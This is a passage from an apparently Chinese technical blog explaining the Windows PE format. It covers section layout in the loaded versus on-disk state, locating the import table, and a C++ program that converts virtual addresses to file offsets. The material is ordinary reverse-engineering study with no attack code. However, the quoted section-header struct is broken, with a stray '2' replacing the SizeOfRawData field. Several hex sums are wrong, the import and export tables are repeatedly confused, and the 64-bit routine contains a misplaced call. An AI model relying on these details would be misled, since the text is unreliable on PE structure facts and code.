<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116200958454.png" alt="image-20211116200958454"></p>
<p>块表的结束地址=块表首地址+块大小，而块大小通过块表当中的SizeOfRawData可以拿到，此处再放出c中的块表定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SIZEOF_SHORT_NAME              8</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line"><span class="number">2</span></span><br><span class="line">    DWORD   PointerToRawData;                <span class="comment">//&lt;--- 块在磁盘文件中的偏移</span></span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<p>根据块表定义可以发现，<code>SizeOfRawData</code>在块表中可以通过块表首地址+16字节(8x1bytes + 2DWORD ) =  8201E8 + 16 = 8201F8</p>
<p>拿到SizeOfRawData大小 00 92 19 00 即 199200</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116202106848.png" alt="image-20211116202106848"></p>
<p>由此可知结束地址：821000 + 199200 = 9BA200 + E00（补0内存对齐1000）</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116203313553.png" alt="image-20211116203313553"></p>
<p><strong>拿到块大小第二种方法</strong></p>
<p>块的大小=块的结束地址-块的起始地址=0x59B000-0x401000=0x19A000（满足内存对齐）</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116203344335.png" alt="image-20211116203344335"></p>
<p><strong>运行态时，块的大小满足内存对齐，而非先前的文件对齐</strong></p>
<h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>在运行态中:</p>
<ul>
<li>DOS头、PE文件头、块表连续存储，中间没有空隙</li>
<li>运行态中，块表与块之间存储可能会有空隙</li>
<li>空隙的大小与SectionAlignMent有关，而非FileAlignMent</li>
<li>块与块之间也有可能会因<code>内存对齐</code>而产生空隙</li>
</ul>
<p>相关数据结构成员：</p>
<table>
<thead>
<tr>
<th>数据结构成员</th>
<th>所属数据结构</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>SectionAlignment</td>
<td>扩展PE头</td>
<td>内存对齐</td>
</tr>
</tbody></table>
<p>各结构的起始和结束位置：</p>
<table>
<thead>
<tr>
<th>结构</th>
<th>起始地址</th>
<th>结束地址</th>
<th>大小</th>
</tr>
</thead>
<tbody><tr>
<td>DOS部首</td>
<td>00820000</td>
<td>008200F0</td>
<td>0xF0=240</td>
</tr>
<tr>
<td>PE文件头</td>
<td>008200F0</td>
<td>00820108</td>
<td>0xF8=244=224+40</td>
</tr>
<tr>
<td>块表</td>
<td>008201E8</td>
<td>008202AF</td>
<td>0x1E8=200=7*40</td>
</tr>
<tr>
<td>前三个结构</td>
<td>00820000</td>
<td>00821000</td>
<td>0x1000（内存对齐后）</td>
</tr>
<tr>
<td>第一个块</td>
<td>00821000</td>
<td>0x19A000</td>
<td>0x19A000（内存对齐后）</td>
</tr>
</tbody></table>
<h4 id="运行态与非运行态相同点"><a href="#运行态与非运行态相同点" class="headerlink" title="运行态与非运行态相同点"></a>运行态与非运行态相同点</h4><h5 id="相同"><a href="#相同" class="headerlink" title="相同"></a><strong>相同</strong></h5><p>无论是运行态，还是非运行态，DOS头、PE头、块表均为连续存储，中间没有填充间隙</p>
<p>第一个块表首地址都三个头的大小影响，紧随着对齐后的三个头</p>
<p>块与块之间也需要进行对齐</p>
<h5 id="不同"><a href="#不同" class="headerlink" title="不同"></a>不同</h5><p>运行态与非运行态的起始地址不同</p>
<p>在非运行态中，块表与块之间、块与块之间的间隙由<code>文件对齐(FileAlignment)</code>产生</p>
<p>在运行态中，块表与块之间、块与块之间的间隙由<code>内存对齐(SectionAlignment)</code>产生</p>
<h5 id="非运行态与运行态映射图"><a href="#非运行态与运行态映射图" class="headerlink" title="非运行态与运行态映射图"></a>非运行态与运行态映射图</h5><p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116204836412.png" alt="image-20211116204836412"></p>
]]></content>
      <categories>
        <category>PE结构</category>
      </categories>
      <tags>
        <tag>PE结构</tag>
      </tags>
  </entry>
  <entry>
    <title>PE结构-导入表（2）</title>
    <url>/2021/10/13/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2)/</url>
    <content><![CDATA[<p>首先，PE文件中的数据被载入内存后根据不同页面属性被划分成很多区块(节)，并有区块表（节表）的数据来描述这些区块，这里我们需要注意一点：<strong>一个区块中的数据仅仅知识由于属性相同而放一起，并不一定是同一种用途的内容。例如输入表、输出表等就有可能和只读常量一起被放在同一个区块中。因为他们的属性都是可读不可写的。</strong></p>
<p>其次，由于不同用途的数据有可能被放入同一个区块中，因此仅仅依靠区块表是无法确定和定位的。因此还需要通过PE文件头中的IMAGE_OPTIONAL_READER32结构的数据目录表来指出他们的位置，我们可以由数据目录表来定位他们的位置，我们可以由数据目录表来定位的数据包括输入表、输出表、资源、重定位表和TLS等15种数据。</p>
<h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h3><h4 id="导入表的作用"><a href="#导入表的作用" class="headerlink" title="导入表的作用"></a>导入表的作用</h4><p>当程序运行时，需要多个PE文件共同组成</p>
<p>PE文件提供哪些功能给其他PE文件是导出表的作用</p>
<p>PE文件需要依赖的模块以及依赖模块中的哪些函数是导出表的作用</p>
<span id="more"></span>

<h4 id="什么是导出表"><a href="#什么是导出表" class="headerlink" title="什么是导出表"></a>什么是导出表</h4><p>导出表是用于记录该PE文件还需要依赖的模块以及依赖这些模块中的那些函数的一种结构</p>
<h4 id="如何定位导入表"><a href="#如何定位导入表" class="headerlink" title="如何定位导入表"></a>如何定位导入表</h4><p><strong>定位导入表的原理</strong></p>
<p>根据之前所学可知，导入、导出等表的起始位置和大小都存放在了IMAGE_OPTIONAL_HEADERS结构的DataDirectory数组当中。而导入表对应的下标为1</p>
<table>
<thead>
<tr>
<th align="left">宏定义</th>
<th align="left">值</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">IMAGE_DIRECTORY_ENTRY_IMPORT</td>
<td align="left">1</td>
<td align="left">导入表</td>
</tr>
</tbody></table>
<p>定位导入表流程</p>
<ol>
<li>找到扩展PE头IMAGE_OPTIONAL_HEADERS的最后一个成员DataDirectory[1]</li>
<li>根据DataDirectory[1].VirtualAddress 得到导入表的RVA</li>
<li>将导入表的RVA转为FOA，在文件中定位到导入表</li>
</ol>
<h3 id="根据流程定位导入表"><a href="#根据流程定位导入表" class="headerlink" title="根据流程定位导入表"></a>根据流程定位导入表</h3><h4 id="分析demo"><a href="#分析demo" class="headerlink" title="分析demo"></a>分析demo</h4><p>使用everEdit.exe</p>
<h4 id="找到DataDirectory-1"><a href="#找到DataDirectory-1" class="headerlink" title="找到DataDirectory[1]"></a>找到DataDirectory[1]</h4><p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015152622826.png" alt="image-20211015152622826"></p>
<p>根据索引，我们找到DataDirectory[1]即第二个表导出表的数据目录</p>
<table>
<thead>
<tr>
<th>iMAGE_data_directory成员</th>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>VirtualAddress</td>
<td>0x001CF47C</td>
<td>导出表的RVA地址</td>
</tr>
<tr>
<td>Size</td>
<td>0x00000140</td>
<td>导出表的大小</td>
</tr>
</tbody></table>
<h4 id="得到导出表的RVA"><a href="#得到导出表的RVA" class="headerlink" title="得到导出表的RVA"></a>得到导出表的RVA</h4><p>导出表的RVA即0x001CF47C</p>
<p>修改VA转FOA程序代码，求出导出表FOA</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PE.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">//在VC6这个比较旧的环境里，没有定义64位的这个宏，需要自己定义，在VS2019中无需自己定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64  0x8664</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 32位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa32</span><span class="params">(UINT va, _IMAGE_DOS_HEADER *dos,_IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew+<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);        </span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            UINT offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            UINT foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 64位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa64</span><span class="params">(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS64* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);</span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">				<span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x1CF47C</span>,dos,(_IMAGE_NT_HEADERS*)nt,sectionArr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            <span class="keyword">int</span> offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            <span class="keyword">int</span> foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//创建DOS对应的结构体指针</span></span><br><span class="line">    _IMAGE_DOS_HEADER* dos;</span><br><span class="line">    <span class="comment">//读取文件，返回文件句柄</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;C:\\Users\\86156\\Desktop\\everEdit.exe&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//根据文件句柄创建映射</span></span><br><span class="line">    HANDLE hMap = <span class="built_in">CreateFileMappingA</span>(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//映射内容</span></span><br><span class="line">    LPVOID pFile = <span class="built_in">MapViewOfFile</span>(hMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//类型转换，用结构体的方式来读取</span></span><br><span class="line">    dos = (_IMAGE_DOS_HEADER*)pFile;</span><br><span class="line">    <span class="comment">//输出dos-&gt;e_magic，以十六进制输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dos-&gt;e_magic:%X\n&quot;</span>, dos-&gt;e_magic);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向PE文件头标志的指针</span></span><br><span class="line">    DWORD* peId;</span><br><span class="line">    <span class="comment">//让PE文件头标志指针指向其对应的地址=DOS首地址+偏移</span></span><br><span class="line">    peId = (DWORD*)((UINT)dos + dos-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//输出PE文件头标志，其值应为4550，否则不是PE文件</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;peId:%X\n&quot;</span>, *peId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向可选PE头的第一个成员magic的指针</span></span><br><span class="line">    WORD* magic;</span><br><span class="line">    <span class="comment">//让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小</span></span><br><span class="line">    magic = (WORD*)((UINT)peId + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD) + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_FILE_HEADER));</span><br><span class="line">    <span class="comment">//输出magic，其值为0x10b代表32位程序，其值为0x20b代表64位程序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic:%X\n&quot;</span>, *magic);</span><br><span class="line">    <span class="comment">//根据magic判断为32位程序还是64位程序</span></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (*magic) &#123;</span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR32_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;32位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为32位程序后，就可以使用_IMAGE_NT_HEADERS来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS* nt;</span><br><span class="line">        <span class="comment">//让PE文件头指针指向其对应的地址</span></span><br><span class="line">        nt = (_IMAGE_NT_HEADERS*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**) <span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span>(cnt&lt; nt-&gt;FileHeader.NumberOfSections)&#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER)*cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x11320</span>,dos,nt,sectionArr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR64_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;64位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为64位程序后，就可以使用_IMAGE_NT_HEADERS64来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS64* nt;</span><br><span class="line">        nt = (_IMAGE_NT_HEADERS64*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址，区别在于这里加上的偏移为_IMAGE_NT_HEADERS64</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span> (cnt &lt; nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER) * cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此代码本是将VA转为FOA值，但由于VA = ImageBase + RVA，我们可以修改增加一句关键代码使其RVA转FOA</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x1CF47C</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015153401402.png" alt="image-20211015153401402"></p>
<p>拿到导出表文件偏移FOA:0x10720</p>
<p>完成定位</p>
<h4 id="导入表结构"><a href="#导入表结构" class="headerlink" title="导入表结构"></a>导入表结构</h4><h4 id="导入表个数"><a href="#导入表个数" class="headerlink" title="导入表个数"></a>导入表个数</h4><p>与导出表不同，导入表通常需要包含多个模块，而不像导出表只需要提供PE文件需要提供的导出函数即可</p>
<p>因此，导出表只有一个，但导入表可能会有多个</p>
<p>当程序运行时，需要依赖几个模块，就有对应几个导出表</p>
<p>导出表的结构体</p>
<p>在C语言中，导出表的结构如下(在winnt.h中有定义)</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015154327762.png" alt="image-20211015154327762"></p>
